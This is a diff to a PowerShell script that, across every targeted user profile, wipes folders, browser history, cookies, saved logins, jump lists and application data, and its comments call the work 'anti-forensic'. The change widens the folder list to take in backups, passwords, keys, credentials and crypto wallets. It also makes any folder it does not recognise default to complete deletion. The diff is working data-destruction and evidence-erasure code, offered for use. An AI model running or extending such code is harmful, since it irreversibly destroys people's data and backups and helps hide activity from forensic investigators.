@@ -1014,7 +1014,65 @@ foreach ($user in $targetUsers) {
         "GoogleDrive", "Dropbox", "OneDrive - Personal", "OneDrive - Work",
         # Other Common Third-Party Folders
         "Projects", "Workspace", "Work", "Personal", "My Files", "My Documents",
-        "Downloads", "Temp", "Temporary", "Cache", "Logs", "Data"
+        "Temp", "Temporary", "Cache", "Logs", "Data",
+        # Application-Specific Folders (Common Third-Party Apps)
+        "Adobe", "Autodesk", "Blender", "GIMP", "Inkscape", "Krita",
+        "Steam", "Epic Games", "Origin", "Uplay", "Battle.net",
+        "VirtualBox VMs", "VMware", "Hyper-V", "Docker",
+        "Python", "Java", "Node", "Ruby", "Go", "Rust",
+        "Android", "AndroidStudioProjects", "AndroidStudio",
+        "Visual Studio", "VisualStudio", "VS Code", "Code",
+        "Eclipse", "IntelliJ", "NetBeans", "Android Studio",
+        "Git", "GitHub", "Bitbucket", "SourceTree",
+        "Plex", "Kodi", "VLC", "MediaMonkey", "iTunes",
+        "BitTorrent", "uTorrent", "qBittorrent", "Transmission",
+        "WinRAR", "7-Zip", "WinZip", "PeaZip",
+        "Notepad++", "Sublime Text", "Atom", "Brackets",
+        "PuTTY", "FileZilla", "WinSCP", "Cyberduck",
+        "Thunderbird", "Outlook", "Mail", "Emails",
+        "Skype", "Zoom", "Teams", "Slack", "Microsoft Teams",
+        "Spotify", "iTunes", "MusicBee", "Foobar2000",
+        "Photoshop", "Lightroom", "Premiere", "After Effects",
+        "Games", "Game", "Gaming", "SteamLibrary",
+        "Backup", "Backups", "Archive", "Archives",
+        "Documents Backup", "My Backup", "User Backup",
+        "Private", "Secret", "Hidden", "Confidential",
+        "Passwords", "Keys", "Credentials", "Tokens",
+        "Wallet", "Wallets", "Crypto", "Bitcoin", "Ethereum",
+        "Tor", "VPN", "Proxy", "Tunnel",
+        "Scripts", "Script", "Code", "Source", "Sources",
+        "Test", "Tests", "Testing", "Debug", "Debugging",
+        "Build", "Builds", "Dist", "Distribution",
+        "Config", "Configs", "Configuration", "Settings",
+        "Library", "Libraries", "Libraries", "Packages",
+        "Modules", "Plugins", "Extensions", "Addons",
+        "Themes", "Skins", "Custom", "Customization",
+        "Templates", "Samples", "Examples", "Demos",
+        "Reports", "Reports", "Exports", "Imports",
+        "Database", "Databases", "DB", "SQL",
+        "Log", "Logs", "Trace", "Traces", "Debug Logs",
+        "Crash", "Crashes", "Dumps", "Memory Dumps",
+        "Screenshots", "Screen Captures", "Recordings",
+        "Movies", "Films", "Media",
+        "Photos", "Images", "Graphics",
+        "Files", "My Files", "Personal Files",
+        "Download", "Incoming", "Received",
+        "Uploads", "Upload", "Outgoing", "Sent",
+        "Share", "Shared", "Sharing", "Public",
+        "Sync", "Synced", "Syncing", "Synchronized",
+        "Cloud", "Clouds", "Online", "Remote",
+        "Local", "Offline", "Cached", "Cache",
+        "Temp", "Temporary", "Tmp", "Scratch",
+        "Trash", "Recycle", "Deleted", "Removed",
+        "Old", "Old Files", "Archive", "Archived",
+        "Backup", "Backups", "Copy", "Copies",
+        "Version", "Versions", "History", "Histories",
+        "Snapshot", "Snapshots", "Checkpoint", "Checkpoints",
+        "Recovery", "Recovered", "Restore", "Restored",
+        "Export", "Exports", "Import", "Imports",
+        "Backup Files", "My Backups", "User Backups",
+        "System Backups", "Application Backups",
+        "Data Backups", "File Backups", "Folder Backups"
     )
     
     # SPEED OPTIMIZATION: Process root files immediately (no full scan)
@@ -1031,12 +1089,15 @@ foreach ($user in $targetUsers) {
         $folderPath = $folder.FullName
         
         # Check if it's a known non-standard folder (definitely wipe)
-        $isKnownNonStandard = $knownNonStandardFolders -contains $folderName -or
-                             $folderName.StartsWith(".") -or  # Hidden folders (usually non-standard)
-                             ($folderName -notin $preserveFolders -and 
-                              $folderName -notmatch "^(Desktop|Documents|Downloads|Pictures|Music|Videos|Favorites|Links|Saved Games|Contacts|Searches|AppData|3D Objects|OneDrive)$")
+        # OPTIMIZATION: Fast check - hidden folders or known non-standard
+        $isHidden = $folderName.StartsWith(".")
+        $isKnownNonStandard = $knownNonStandardFolders -contains $folderName
+        $isStandardFolder = $preserveFolders -contains $folderName
         
-        if ($preserveFolders -contains $folderName) {
+        # If not standard and not in preserve list, assume non-standard (safer for anti-forensic)
+        $shouldWipe = $isHidden -or $isKnownNonStandard -or (-not $isStandardFolder)
+        
+        if (-not $shouldWipe) {
             # Standard folder - wipe contents but preserve structure
             Write-Host "      -> Wiping contents of: $folderName" -ForegroundColor DarkGray
             # TURBO: Process and delete immediately (streaming) - NO RECURSIVE SCAN FIRST
@@ -1048,13 +1109,15 @@ foreach ($user in $targetUsers) {
             if (-not (Test-Path $folderPath)) {
                 New-Item -ItemType Directory -Path $folderPath -Force -ErrorAction SilentlyContinue | Out-Null
             }
-        } elseif ($isKnownNonStandard) {
-            # Known non-standard folder - wipe completely (TURBO MODE)
-            Write-Host "      -> Wiping non-standard folder: $folderName" -ForegroundColor DarkGray
-            Force-Eradicate $folderPath "Folder"
         } else {
-            # Unknown folder - assume non-standard and wipe (safer for anti-forensic)
-            Write-Host "      -> Wiping unknown folder (assumed non-standard): $folderName" -ForegroundColor DarkGray
+            # Non-standard folder (hidden, known, or unknown) - wipe completely (TURBO MODE)
+            if ($isKnownNonStandard) {
+                Write-Host "      -> Wiping known non-standard folder: $folderName" -ForegroundColor DarkGray
+            } elseif ($isHidden) {
+                Write-Host "      -> Wiping hidden folder: $folderName" -ForegroundColor DarkGray
+            } else {
+                Write-Host "      -> Wiping unknown folder (assumed non-standard): $folderName" -ForegroundColor DarkGray
+            }
             Force-Eradicate $folderPath "Folder"
         }
     }
@@ -1363,33 +1426,51 @@ if (Test-Path $jumpListPath2) {
 }
 Write-Host "   [+] Jump Lists: ANNIHILATED" -ForegroundColor DarkGray
 
-# 7. Wipe Artifact Paths - OPTIMIZED FOR SPEED
+# 7. Wipe Artifact Paths - ULTRA OPTIMIZED FOR SPEED
 $totalArtifacts = $appData.Count
-$artCounter = 0
-Write-Host "   [~] Processing $totalArtifacts artifact paths (streaming)..." -ForegroundColor DarkGray
+Write-Host "   [~] Processing $totalArtifacts artifact paths (ultra-fast streaming)..." -ForegroundColor DarkGray
 
-foreach ($path in $appData) {
-    $artCounter++
-    if ($artCounter % 10 -eq 0 -or $artCounter -eq $totalArtifacts) {
-        Write-Host "      -> Processing artifact $artCounter of $totalArtifacts: $(Split-Path $path -Leaf)" -ForegroundColor DarkGray
-    }
-    
-    if (Test-Path $path) {
-        # SPEED OPTIMIZATION: Skip browser artifact hunting for non-browser paths
-        $isBrowserPath = $path -like "*Chrome*" -or $path -like "*Edge*" -or $path -like "*Firefox*" -or $path -like "*Brave*" -or $path -like "*Opera*"
-        
-        if ($isBrowserPath) {
-            # Special Hunter for Browsers: History, Cookies, Web Data (only for browser paths)
-            $browserFiles = @("History", "Cookies", "Web Data", "Login Data", "Top Sites", "Visited Links")
+# SPEED OPTIMIZATION: Pre-filter browser paths to avoid checking in loop
+$browserPaths = $appData | Where-Object { $_ -like "*Chrome*" -or $_ -like "*Edge*" -or $_ -like "*Firefox*" -or $_ -like "*Brave*" -or $_ -like "*Opera*" }
+$nonBrowserPaths = $appData | Where-Object { $_ -notlike "*Chrome*" -and $_ -notlike "*Edge*" -and $_ -notlike "*Firefox*" -and $_ -notlike "*Brave*" -and $_ -notlike "*Opera*" }
+
+# Process browser paths with artifact hunting
+if ($browserPaths.Count -gt 0) {
+    Write-Host "   [~] Processing $($browserPaths.Count) browser paths with artifact hunting..." -ForegroundColor DarkGray
+    $browserFiles = @("History", "Cookies", "Web Data", "Login Data", "Top Sites", "Visited Links")
+    $browserCount = 0
+    foreach ($path in $browserPaths) {
+        $browserCount++
+        if ($browserCount % 5 -eq 0 -or $browserCount -eq $browserPaths.Count) {
+            Write-Host "      -> Browser path $browserCount of $($browserPaths.Count)..." -ForegroundColor DarkGray
+        }
+        if (Test-Path $path) {
+            # Special Hunter for Browsers: History, Cookies, Web Data
             Get-ChildItem -Path $path -Include $browserFiles -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                 Force-Eradicate $_.FullName "File"
             }
+            # TURBO MODE: Fast streaming deletion
+            Force-Eradicate $path "Folder"
         }
-        
-        # TURBO MODE: Fast streaming deletion (no counting/collecting)
-        Force-Eradicate $path "Folder"
     }
 }
+
+# Process non-browser paths (FAST - no artifact hunting)
+if ($nonBrowserPaths.Count -gt 0) {
+    Write-Host "   [~] Processing $($nonBrowserPaths.Count) non-browser paths (fast mode)..." -ForegroundColor DarkGray
+    $nbCounter = 0
+    foreach ($path in $nonBrowserPaths) {
+        $nbCounter++
+        if ($nbCounter % 20 -eq 0 -or $nbCounter -eq $nonBrowserPaths.Count) {
+            Write-Host "      -> Non-browser path $nbCounter of $($nonBrowserPaths.Count)..." -ForegroundColor DarkGray
+        }
+        if (Test-Path $path) {
+            # TURBO MODE: Direct deletion (no artifact hunting for non-browser paths)
+            Force-Eradicate $path "Folder"
+        }
+    }
+}
+
 Write-Host "   [+] Artifacts: SCORCHED" -ForegroundColor DarkGray
 
 # --- TELEGRAM & WHATSAPP REGISTRY CLEANUP (AUTHENTICATION KEYS) ---
